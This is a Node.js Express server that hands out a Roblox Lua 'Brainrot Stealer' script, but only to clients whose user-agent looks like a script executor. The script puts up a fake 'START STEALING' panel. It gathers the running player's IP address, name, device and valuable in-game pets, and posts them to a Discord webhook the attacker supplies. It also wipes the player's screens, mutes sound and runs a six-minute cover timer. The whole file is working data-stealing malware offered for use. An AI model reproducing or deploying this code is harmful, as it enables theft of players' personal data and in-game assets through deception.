// server.js
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.text({ type: '*/*' }));

// BLOCK NON-EXECUTORS
function blockNonExecutor(req, res, next) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ref = (req.headers["referer"] || "").toLowerCase();

  const allowed = ua.includes("roblox") ||
                  ua.includes("synapse") ||
                  ua.includes("krnl") ||
                  ua.includes("fluxus") ||
                  ua.includes("executor") ||
                  ref.includes("roblox.com");

  if (!allowed) {
    return res.status(403).send("Access denied - Executor only");
  }
  next();
}

// HOME
app.get("/", (req, res) => {
  res.send("Brainrot Stealer Server - Use /raw?wh=WEBHOOK_URL");
});

// /raw → RETURN LUA SCRIPT
app.get("/raw", blockNonExecutor, (req, res) => {
  const webhook = req.query.wh;

  if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK -- Must be a valid Discord webhook URL");
  }

  const luaScript = `-- BRAINROT STEALER - FIXED VERSION
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
if not player then 
    repeat task.wait() until Players.LocalPlayer 
    player = Players.LocalPlayer 
end

repeat task.wait() until player:FindFirstChild("PlayerGui")
pcall(function() 
    HttpService.HttpEnabled = true 
end)
task.wait(0.5)

local WebhookURL = "${webhook}"

local function SafeHttp(url, body)
    local success, result = pcall(function()
        if syn and syn.request then
            local response = syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
        
        if request and type(request) == "function" then
            local response = request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
        
        if HttpService.HttpEnabled then
            pcall(function() 
                HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson) 
            end)
            return true
        end
        
        return false
    end)
    return success and result
end

local function Send(embed)
    local jsonData = HttpService:JSONEncode({embeds = {embed}})
    task.spawn(function() 
        SafeHttp(WebhookURL, jsonData) 
    end)
end

local function GetExecutor()
    if syn then return "Synapse X" 
    elseif KRNL_LOADED then return "Krnl" 
    elseif fluxus then return "Fluxus" 
    elseif PROTOSMASHER_LOADED then return "ProtoSmasher" 
    elseif electron then return "Electron" 
    else return "Unknown" end
end

local function GetIP()
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org", true)
    end)
    return success and ip or "Unknown"
end

local function GetDevice()
    return UserInputService.TouchEnabled and "Mobile" or "PC"
end

local function FormatMoney(value)
    if value >= 1e9 then return string.format("$%.2fB/s", value/1e9) 
    elseif value >= 1e6 then return string.format("$%.2fM/s", value/1e6) 
    elseif value >= 1e3 then return string.format("$%.2fK/s", value/1e3) 
    else return "$" .. value .. "/s" end
end

local function FormatPetList(pets, showMoney)
    if #pets == 0 then return "None" end
    local result = ""
    for i = 1, math.min(5, #pets) do
        local displayValue = showMoney and FormatMoney(pets[i].Money) or pets[i].Rate
        result = result .. i .. ". " .. pets[i].Name .. " | " .. displayValue .. "\\n"
    end
    return result
end

local function CreateScannerGUI()
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetChildren()) do 
            pcall(function() gui:Destroy() end) 
        end
        for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do 
            if gui.Name ~= "RobloxGui" then 
                pcall(function() gui:Destroy() end) 
            end 
        end
    end)
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotScanner"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local background = Instance.new("Frame")
    background.Size = UDim2.new(2, 0, 2, 0)
    background.Position = UDim2.new(-0.5, 0, -0.5, 0)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BorderSizePixel = 0
    background.Parent = screenGui
    
    local timerLabel = Instance.new("TextLabel")
    timerLabel.Size = UDim2.new(1, 0, 0, 80)
    timerLabel.Position = UDim2.new(0, 0, 0.4, 0)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "06:00"
    timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    timerLabel.TextSize = 48
    timerLabel.Font = Enum.Font.GothamBold
    timerLabel.Parent = background
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 25)
    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Initializing..."
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.TextSize = 18
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Parent = background
    
    return screenGui, timerLabel, statusLabel
end

local function ScanPets()
    local allPets = {}
    local brainrotPets = {}
    local topPets = {}
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots") 
        if not plots then return end
        
        for _, plot in pairs(plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums") 
            if not pods then continue end
            
            for _, pod in pairs(pods:GetChildren()) do
                local base = pod:FindFirstChild("Base") 
                if not base then continue end
                local spawn = base:FindFirstChild("Spawn") 
                if not spawn then continue end
                local attachment = spawn:FindFirstChild("Attachment") 
                if not attachment then continue end
                local overhead = attachment:FindFirstChild("AnimalOverhead") 
                if not overhead then continue end
                local nameLabel = overhead:FindFirstChild("DisplayName")
                local genLabel = overhead:FindFirstChild("Generation")
                
                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end
                
                local petName = nameLabel.Text 
                local rateText = genLabel and genLabel.Text or "0/s" 
                if petName == "" then continue end
                
                local rateNumber = tonumber(string.match(rateText, "([%d%.]+)")) or 0
                local moneyValue = 0
                
                if string.find(rateText, "B/s") then moneyValue = rateNumber * 1e9 
                elseif string.find(rateText, "M/s") then moneyValue = rateNumber * 1e6 
                elseif string.find(rateText, "K/s") then moneyValue = rateNumber * 1e3 
                else moneyValue = rateNumber end
                
                local petData = {Name = petName, Rate = rateText, Money = moneyValue}
                table.insert(allPets, petData)
                
                if string.find(string.lower(petName), "brainrot") and moneyValue > 1e6 then 
                    table.insert(brainrotPets, petData) 
                end
            end
        end
    end)
    
    table.sort(allPets, function(a, b) return a.Money > b.Money end)
    table.sort(brainrotPets, function(a, b) return a.Money > b.Money end)
    
    for i = 1, math.min(5, #allPets) do 
        if allPets[i].Money > 0 then table.insert(topPets, allPets[i]) end 
    end
    
    return allPets, brainrotPets, topPets
end

local function EvaluateHit(brainrotPets, topPets)
    if #brainrotPets > 2 then return "LEGIT HIT - Multiple brainrots" end
    if #topPets > 0 and topPets[1].Money > 5e7 then return "LEGIT HIT - High value" end
    if #brainrotPets > 0 then return "POTENTIAL - Brainrot found" end
    return "LOW VALUE - Nothing good"
end

local function StartStealing(gameLink)
    local executor = GetExecutor()
    local ipAddress = GetIP()
    local device = GetDevice()
    local playerCount = #Players:GetPlayers()
    
    local scannerGui, timerDisplay, statusDisplay = CreateScannerGUI()
    
    pcall(function() game:GetService("SoundService").Volume = 0 end)
    statusDisplay.Text = "Scanning pets..." 
    task.wait(1.5)
    
    local allPets, brainrotPets, topPets = ScanPets()
    local hitStatus = EvaluateHit(brainrotPets, topPets)
    statusDisplay.Text = "Sending logs..."
    
    local embed = {
        title = "BRAINROT STEALER - LOGS",
        description = "Game: " .. (gameLink or "Unknown"),
        color = 65280,
        author = {name = player.Name, icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"},
        fields = {
            {name = "USER INFO", value = "Executor: " .. executor .. "\\nIP: " .. ipAddress .. "\\nDevice: " .. device, inline = true},
            {name = "PROFILE", value = "[View](https://www.roblox.com/users/" .. player.UserId .. "/profile)", inline = true},
            {name = "SERVER", value = "Players: " .. playerCount .. "\\nPets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets, inline = true},
            {name = "TOP 5 PETS", value = FormatPetList(topPets, true), inline = false},
            {name = "BRAINROTS", value = FormatPetList(brainrotPets, true), inline = false},
            {name = "HIT STATUS", value = hitStatus, inline = false}
        },
        footer = {text = "Brainrot Stealer • " .. os.date("%X")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    Send(embed)
    statusDisplay.Text = "6-minute timer..." 
    task.wait(1)
    
    local totalTime = 360
    local startTime = tick()
    while tick() - startTime < totalTime do
        local timeLeft = totalTime - (tick() - startTime)
        local minutes = math.floor(timeLeft / 60)
        local seconds = math.floor(timeLeft % 60)
        timerDisplay.Text = string.format("%02d:%02d", minutes, seconds)
        task.wait(0.1)
    end
    
    local completionEmbed = {
        title = "BRAINROT STEALER - COMPLETE",
        color = 32768,
        author = {name = player.Name, icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"},
        fields = {{name = "RESULTS", value = "Time: 6:00\\nPets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets .. "\\nStatus: " .. hitStatus, inline = false}},
        footer = {text = "Brainrot Stealer • " .. os.date("%X")}
    }
    
    Send(completionEmbed)
    statusDisplay.Text = "Complete!" 
    timerDisplay.Text = "DONE" 
    task.wait(3)
    pcall(function() scannerGui:Destroy() end)
end

local function CreateGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StealerPanel"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 250)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    title.Text = "BRAINROT STEALER\\nEVERYONE CAN USE"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame
    
    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(0.8, 0, 0, 40)
    inputBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    inputBox.TextColor3 = Color3.new(1, 1, 1)
    inputBox.PlaceholderText = "Paste Roblox game link..."
    inputBox.Parent = mainFrame
    
    local startButton = Instance.new("TextButton")
    startButton.Size = UDim2.new(0.7, 0, 0, 50)
    startButton.Position = UDim2.new(0.15, 0, 0.7, 0)
    startButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    startButton.Text = "START STEALING"
    startButton.TextColor3 = Color3.new(1, 1, 1)
    startButton.Font = Enum.Font.GothamBold
    startButton.TextSize = 18
    startButton.Parent = mainFrame
    
    startButton.MouseButton1Click:Connect(function()
        local link = inputBox.Text
        if string.find(string.lower(link), "roblox%.com") then
            startButton.Text = "STARTING..."
            startButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
            task.wait(1)
            StartStealing(link)
        else
            startButton.Text = "INVALID LINK"
            startButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
            task.wait(2)
            startButton.Text = "START STEALING"
            startButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        end
    end)
end

CreateGUI()
print("Brainrot Stealer loaded successfully!")`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.send(luaScript);
});

// 404 Handler
app.use((req, res) => {
  res.status(404).send("Endpoint not found");
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server LIVE on port ${PORT}`);
});
